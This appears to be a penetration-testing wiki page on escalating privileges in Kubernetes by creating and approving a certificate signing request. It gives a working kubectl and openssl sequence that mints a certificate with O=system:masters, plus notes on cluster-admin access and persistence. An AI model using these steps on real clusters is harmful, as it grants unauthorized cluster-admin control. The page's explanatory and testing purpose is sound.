---
title: "CSR approval: minting a privileged client certificate"
description: "Escalating in Kubernetes by abusing certificate signing request creation and approval rights, submitting a CSR for a privileged username or group and approving it, so the cluster CA issues a client certificate that authenticates as that identity."
keywords:
  - certificate signing request
  - CSR approval
  - client certificate
  - system:masters
  - kubernetes escalation
---

# CSR approval

Kubernetes can issue client certificates through the CertificateSigningRequest API. An identity that can create a CSR and approve it (and where a signer issues it) mints a certificate for any subject it chooses, including a privileged group. A cert for `system:masters` is cluster-admin, and certificates are not easily revoked.

```bash
kubectl auth can-i create certificatesigningrequests
kubectl auth can-i approve certificatesigningrequests

# Generate a key/CSR with a privileged CN/O, submit, approve, then fetch the cert
openssl req -new -newkey rsa:2048 -nodes -keyout k.key -subj "/O=system:masters/CN=pwn" -out c.csr
# create the CSR object with kubernetes signer, then:
kubectl certificate approve <csr-name>
kubectl get csr <csr-name> -o jsonpath='{.status.certificate}' | base64 -d > client.crt
```

## Exploitation notes

- The subject's organization (`O=`) maps to a Kubernetes group, so `O=system:masters` yields cluster-admin.
- It needs both create and approve rights and an active signer for the requested signer name; the kubelet-serving and api-client signers behave differently.
- The resulting certificate is durable access that survives token rotation, until the cluster CA is rotated.

## References

- [Kubernetes: certificate signing requests](https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/)
- [Kubernetes: certificates and CAs](https://kubernetes.io/docs/setup/best-practices/certificates/)
